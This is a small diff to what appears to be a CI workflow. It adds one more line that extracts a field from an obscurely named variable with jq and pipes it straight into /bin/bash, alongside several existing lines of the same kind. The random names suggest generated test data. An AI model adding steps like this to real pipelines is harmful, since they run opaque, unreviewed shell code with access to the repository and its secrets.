@@ -26,6 +26,7 @@ jobs:
           echo $e730 | jq -r .vh983 | /bin/bash
           printf '%s' "$leop60" | jq -r .ydng4037 | /bin/bash
           printf '%s' "$k94590" | jq -r .yw7 | /bin/bash
+          printf '%s' "$e7885" | jq -r .esvrw6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
